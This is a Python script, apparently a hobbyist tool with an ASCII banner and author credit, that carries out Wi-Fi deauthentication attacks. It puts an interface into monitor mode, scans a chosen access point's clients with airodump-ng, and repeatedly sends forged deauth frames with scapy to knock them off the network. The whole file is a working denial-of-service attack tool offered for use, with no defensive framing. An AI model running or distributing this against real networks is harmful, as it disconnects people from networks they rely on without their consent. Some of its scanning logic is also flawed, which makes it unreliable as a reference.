import os
import time
from scapy.all import RadioTap, Dot11, sendp

def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface."""
    os.system(f"airmon-ng start {interface}")

def disable_monitor_mode(interface):
    """Disable monitor mode on the specified interface."""
    os.system(f"airmon-ng stop {interface}")

def deauth(target_mac, ap_mac, interface):
    """Send a deauth packet."""
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    frame = RadioTap()/dot11/Dot11.Deauth(reason=7)
    sendp(frame, iface=interface, count=100, inter=0.2, verbose=False)

def scan_and_deauth(ap_bssid, interface, exclusions):
    """Scan for clients connected to a specific AP and deauth them."""
    print(f"Scanning for clients on AP: {ap_bssid}...")
    try:
        while True:
            # Using airodump-ng to capture connected devices
            os.system(f"airodump-ng --bssid {ap_bssid} -w temp_scan --output-format csv {interface}")
            
            with open("temp_scan-01.csv", "r") as f:
                lines = f.readlines()
                # Read MAC addresses after the CSV headers (clients section)
                for line in lines:
                    fields = line.split(",")
                    if len(fields) > 0:
                        client_mac = fields[0].strip()
                        if client_mac and client_mac not in exclusions and len(client_mac) == 17:
                            print(f"Deauthenticating: {client_mac}")
                            deauth(client_mac, ap_bssid, interface)
    except KeyboardInterrupt:
        print("\nStopping scan and cleanup...")
    finally:
        if os.path.exists("temp_scan-01.csv"):
            os.remove("temp_scan-01.csv")

if __name__ == "__main__":
    print(
'''
      _        _         _______  __                       _                        
     / \      (_)       |_   __ \[  |                     / |_                      
    / _ \     __   _ .--. | |__) || |--.   ,--.   _ .--. `| |-' .--.   _ .--..--.   
   / ___ \   [  | [ `/'`\]|  ___/ | .-. | `'_\ : [ `.-. | | | / .'`\ \[ `.-. .-. |  
 _/ /   \ \_  | |  | |   _| |_    | | | | // | |, | | | | | |,| \__. | | | | | | |  
|____| |____|[___][___] |_____|  [___]|__]\\'-;__/[___||__]\__/ '.__.' [___||__||__] 
                                                                                    
Made By:- Harsh Raj Singhania
Email: raj.harshraut@gmail.com
''')
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")
    ap_bssid = input("Enter the AP's BSSID to target: ")
    exclusions = input("Enter MAC addresses to exclude (comma-separated): ").split(",")
    exclusions = [mac.strip() for mac in exclusions]

    try:
        enable_monitor_mode(interface)
        interface_mon = f"{interface}mon"  # Default monitor mode naming convention
        scan_and_deauth(ap_bssid, interface_mon, exclusions)
    finally:
        disable_monitor_mode(interface)
        print("Monitor mode disabled, exiting.")
